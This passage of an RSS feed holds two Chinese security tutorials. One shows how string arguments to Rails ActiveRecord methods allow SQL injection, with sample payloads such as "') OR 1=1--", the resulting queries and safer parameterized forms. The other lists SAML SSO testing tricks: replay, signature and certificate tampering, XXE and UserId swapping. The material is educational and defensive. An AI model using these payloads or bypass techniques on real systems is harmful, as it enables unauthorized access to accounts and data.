&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27131797&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
Ruby on Rails 是一个经典的 MVC 框架。其中，ActiveRecord 是 MVC 中的 M（模型），负责处理数据和业务逻辑。每一个数据库表对应创建一个类，类的每一个对象实例对应于数据库中表的一行记录，通常表的每个字段在类中都有相应的 Field。ActiveRecord 同时负责把自己持久化，在 ActiveRecord 中封装了对数据库的访问，即 CURD。&lt;br&gt;&lt;br&gt;使用 ActiveRecord 执行 SQL 语句的大概顺序是：&lt;br&gt;&lt;ol&gt;&lt;li&gt;把提供的查询方法转换为等价的 SQL 查询。&lt;/li&gt;&lt;li&gt;触发 SQL 查询并从数据库中检索对应的结果。&lt;br&gt;&lt;/li&gt;&lt;li&gt;为每个查询结果实例化对应的模型对象。&lt;br&gt;&lt;/li&gt;&lt;li&gt;当存在回调时，先调用 after_find 回调再调用 after_initialize 回调。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;只要能够理解第一步中的转换规则，那么针对 ActiveRecord 的 SQL 注入和普通的 SQL 注入并没有什么区别。&lt;p&gt;然而，Rails 为 ActiveRecord 方法提供了内置的 SQL 过滤器，用于转义 &#39;、&quot;、NULL 和换行符，使得大部分 SQL 注入都失去作用。但这并不代表开发者写出来的代码就是绝对安全的。如果没有对用户输入手动进行过滤，并且错误运用了某些方法，那么仍然存在 SQL 注入的风险。具体来讲，在使用某些方法时，需要手动触发这个过滤器。&lt;/p&gt;&lt;p&gt;所谓“错误使用“指的是，向某些方法传入 String 而不是 Array 或 Hash。因为在这种情况下，过滤器不会被触发。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75b92d2df83de4662e105a85fca20ae1.png_r.jpg&quot; data-rawwidth=&quot;970&quot; data-rawheight=&quot;619&quot;&gt;&lt;h2&gt;&lt;b&gt;where&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;以常用的 where 方法作例子，它能够接受的参数类型有 string,array 和 hash。然而，过滤器只有当传入的参数是 array 或 hash 时才是生效。如果开发者直接传入一个 string 类型的参数，那么会带来严重的安全隐患，看下面这个例子:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.where(&quot;name = &#39;#{params[:name]}&#39; AND password = &#39;#{params[:password]}&#39;&quot;)&lt;/code&gt;&lt;p&gt;其中，params[:name]和params[:password] 是表单提交的用户名和密码。转换后的 SQL 语句为：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;params[:name]&#39;  AND password = &#39; params[:password]&#39;)&lt;/code&gt;&lt;p&gt;如果输入的 name为“&#39;) OR 1=1--“，那么 SQL 语句就会变成：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;&#39;) OR 1=1--&#39; AND password = &#39;&#39;)&lt;/code&gt;&lt;p&gt;“OR 1”后面的内容全部被注释掉了，这是很常见的一句话密码，它和不使用 ORM 的情况下SQL 注入的 PAYLOAD 并无二异。&lt;/p&gt;&lt;p&gt;安全的写法如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;传入 Array：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;User.where(&quot;name = ? AND password =?&quot; , entered_user_name, entered_password)&lt;/code&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;或者传入 Hash：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;User.where(name : entered_user_name, password : entered_password )&lt;/code&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这两种情况下过滤器会被触发，输入的引号会被转义引起报错：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;\&#39;) OR 1=1--&#39; AND password = &#39;&#39;)&lt;/code&gt;&lt;h2&gt;&lt;b&gt;find_by&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;同理，find_by 方法也有相同的问题，因为它等价于 where(*args).take:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;params[:id] = &quot;admin = &#39;’ OR 1=1 )#&quot;
User.find_by params[:id]&lt;/code&gt;&lt;p&gt;SQL 语句：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (admin = &#39;’ OR 1=1 )#) LIMIT ?&lt;/code&gt;&lt;br&gt;&lt;p&gt;最安全的方式是传入 Hash:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.find_by admin: params[:id]&lt;/code&gt;&lt;h2&gt;&lt;b&gt;Select/pluck&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;text&quot;&gt;Model.select(:field)&lt;/code&gt;&lt;p&gt;select 方法用于指定查询字段，如果传入的是 String,那么输入完全不会被转义：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;params[:column] = &quot;* FROM users WHERE admin = &#39;t&#39; #&quot;
User.select(params[:column])&lt;/code&gt;&lt;p&gt;&lt;br&gt;SQL：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT * FROM users WHERE admin = &#39;t&#39; # FROM &quot;users&quot;&lt;/code&gt;&lt;p&gt;需要注意 select 方法返回的是 Model 类。&lt;br&gt;pluck 方法和 select 方法作用的地方一致，唯一的不同是 pluck 方法返回一个数组。&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.select(:id).map { |c| c.id } &lt;/code&gt;&lt;p&gt;&lt;br&gt;等价于：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.pluck(:id)&lt;/code&gt;&lt;p&gt;因为 select 和 pluck 方法作用于 SQL 语句的最开始，因此 SQL 注入的方式非常灵活。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;delete_all/destroy_all/update_all&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这三个批量操作方法都可以进行 SQL 注入，只要传入的参数是 String。&lt;br&gt;delete_all 和 destroy_all 的区别是 destroy_all 会触发 ActiveRecord 的回调，而 delete_all 会直接把 SQL 语句传给数据库，所以理论上 destroy_all 比 delete_all 更安全一点。总之，正确的使用方法是传入 Hash。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;参考链接&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;https://rails-sqli.org/&quot; data-editable=&quot;true&quot; data-title=&quot;Rails SQL Injection Examples&quot;&gt;Rails SQL Injection Examples&lt;/a&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-05-26-27131797</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>基于 SAML 的 SSO 的测试小思路</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-05-24-27091683.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;基于 SAML 的 SSO 的测试小思路&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27091683&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;    这次我们来分享一些可用于测试基于 SAML 的 SSO 的方法。 现在很多 SSO 都使用 SAML 作为身份验证过程的一部分，在正常情况下是不会引起安全问题的，但是当 SSO 的配置出错时就可能会导致较大危害。&lt;/p&gt;&lt;p&gt;&lt;b&gt;什么是 SSO &lt;/b&gt;&lt;/p&gt;&lt;p&gt;     SSO 是 Single Sign On 的简称，其定义是在多个应用系统中，用户只需要登陆一次就可以访问所有互相信任的应用系统，简单说就是，一些有关联的网站通常会共享用户信息， 那么用户只需要注册一个账号， 就可以对所有相关联的网站使用该账户来进行登录操作。比如说 Google，你可以使用 Google 账户去登陆 GMail, Blogger, iGoogle 等多个应用。&lt;/p&gt;&lt;p&gt;&lt;b&gt;SAML 简述&lt;/b&gt;&lt;/p&gt;&lt;p&gt;     SAML -安全声明标记语言，是一个 XML 框架，也是一组协议和规范，用于在不同的安全域之间交换认证和授权数据。SAML 标准定义了身份提供者(IP)和服务提供者(SP)，这两者构成了前面所说的不同的安全域。&lt;/p&gt;&lt;p&gt;比如，两台远程机器之间要通讯，为了保证安全，我们可以采用加密等措施，也可以采用SAML 来传输，传输的数据使用符合 SAML 规范的 XML 格式，这样我们就可以不要求两台机器采用什么样的系统，只要求能理解 SAML 规范即可。&lt;/p&gt;&lt;p&gt;     SAML 主要包括三个方面：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;认证申明：表明用户是否已经认证，通常用于 SSO。&lt;br&gt;&lt;/li&gt;&lt;li&gt;属性申明：表明某个 Subject  的属性。&lt;br&gt;&lt;/li&gt;&lt;li&gt;授权申明：表明某个资源的权限。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;p&gt;    传统的应用程序可以在允许用户访问之前会进行检验。但在基于 SAML 的 SSO 模型中， 认证功能被移动到执行认证的外部身份提供者（IP）应用程序中。如下图所示：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ec5bd79a075c991eebee41b8774fe05d.png_r.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;531&quot;&gt;&lt;br&gt;&lt;p&gt;    由图可以看到 IP、SP 和用户三者之间的关系。用户通过浏览器向 IP 发送发送请求， IP 进行身份验证，验证成功之后将数据采用 SAML 传输回来， 浏览器再将这个数据转发给 SP ，让用户成功登陆， 并且让 IP 和 SP之间建立信任关系。在传递数据的时候必须通过用户的浏览器，这为用户提供了修改信息的机会，这是一个可以利用的点。&lt;/p&gt;&lt;p&gt;    SAML 数据是由 base64 编码的，其中最容易被篡改的两个最常见的区域就是签名和断言。签名可以让 IP 和 SP 之间产生信任关系，断言则使 SP 执行信任操作，允许您以特定用户身份访问应用程序。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-86e7cbeca1607a0b0158283f4a7a8e95.png_r.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;380&quot;&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;常见的测试技巧&lt;/b&gt;&lt;/p&gt;&lt;p&gt;消息到期： SAML 消息应包含发出请求的时间、过期时间。如果 SAML 消息永远不会过期，或者到期不被执行，那么会存在信息落入攻击者手中的风险。所以在测试时。可以检查消息的时间戳，例如 &lt;b&gt;IssueInstant &lt;/b&gt;或 &lt;b&gt;NotOnOrAfter &lt;/b&gt;断言。发出请求之后，暂停请求，直到到期结束再允许请求通过 SP ，同时还要确保到期窗口是合理的，比如1-5分钟。&lt;/p&gt;&lt;p&gt;重复请求消息：断言应包含只能被应用程序接受一次的唯一 ID。所以我们可以尝试重复请求SAML 消息以创建多个会话。&lt;/p&gt;&lt;p&gt;签名：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在邮件缺少签名的情况下，可以篡改 SP 应用程序的权限。&lt;br&gt;&lt;/li&gt;&lt;li&gt;当 CA 证书是属于自签名的时候，可以选择克隆证书或者创建证书来达到替换原来证书的目的。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;p&gt;来自不同收件人的 SAML：应用程序应仅接受用于 SP 应用程序的 SAML 消息。如果应用程序不执行此检查，它可能会对从另一个应用程序进行身份验证，并对生成的 SAML 消息进行备份，允许您从其他应用程序以用户身份进入该应用程序。如果您成功登录了使用相同 IP（外部身份提供者 ） 的其他应用程序，在登录之后记录消息，然后将记录的消息重新发送到您的目标 SP。&lt;/p&gt;&lt;p&gt;XML 外部实体（XXE）：SAML 消息只是由服务提供商处理用户提供的 XML 消息。确保检查所有标准的 XML 攻击向量。XXE 是一种非常普遍的 XML 攻击，可以通过 SAML 消息找到它。&lt;/p&gt;&lt;p&gt;&lt;b&gt;利用SAML漏洞&lt;/b&gt;&lt;/p&gt;&lt;p&gt;     一些攻击，例如重新请求过期消息或重新请求另一个应用程序的消息，是可以产生一定的效果的。上述大多数漏洞是允许修改断言的，这需要充分利用所发现的漏洞。如果您能够以发送自己的断言的方式篡改 SAML 消息，试试以下操作：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;更改过期邮件的有效期，使其再次生效&lt;br&gt;&lt;/li&gt;&lt;li&gt;将 UserId 更改为不同的有效用户 - 如果可以更改为管理员的用户，就相当有趣了&lt;br&gt;&lt;/li&gt;&lt;li&gt;将 UserId 更改为无效用户 - 有时，应用程序将会向无效用户授予默认权限或更高权限&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;SAML Raider&lt;/b&gt;&lt;/p&gt;&lt;p&gt;     用于测试 SAML 的一个非常有用的工具是 Burp Suite 的 SAML Raider 扩展。它自动突显包含SAML 消息的代理请求，并向已解码的有效载荷添加代理选项卡。SAML Raider 还向 Repeater添加了一个窗格，允许您快速发布受欢迎的签名包装（XSW）攻击。最后，SAML Raider 添加了一个 Certs 选项卡，使克隆证书变得容易。您可以直接克隆证书或创建证书的自签名版本。可以参考这篇文章：&lt;a href=&quot;http://research.aurainfosec.io/bypassing-saml20-SSO/&quot; data-editable=&quot;true&quot; data-title=&quot;Bypassing SAML 2.0 SSO with XML Signature Attacks&quot; class=&quot;&quot;&gt;Bypassing SAML 2.0 SSO with XML Signature Attacks&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;b&gt;总结：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;     SAML 的安全性是 SSO 应用领域中经常被忽视的地方。成功的 SAML 攻击会导致严重的漏洞，例如重新请求会话，获得访问未经授权的应用程序的权限。攻击 SAML 有很多手段，但SAML Raider 等工具可以帮助检测和利用常见的 SAML 问题。所以你可以通过使用这些工具，进行检测，从而去避免自己的应用程序被攻击。&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考链接：&lt;/b&gt;&lt;/p&gt;&lt;a href=&quot;https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/&quot; data-editable=&quot;true&quot; data-title=&quot;Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them&quot; class=&quot;hover&quot;&gt;Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them&lt;/a&gt;  &lt;a href=&quot;https://github.com/jasny/sso/wiki&quot; data-editable=&quot;true&quot; data-title=&quot;jasny/sso&quot; class=&quot;&quot;&gt;jasny/sso&lt;/a&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-05-24-27091683</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
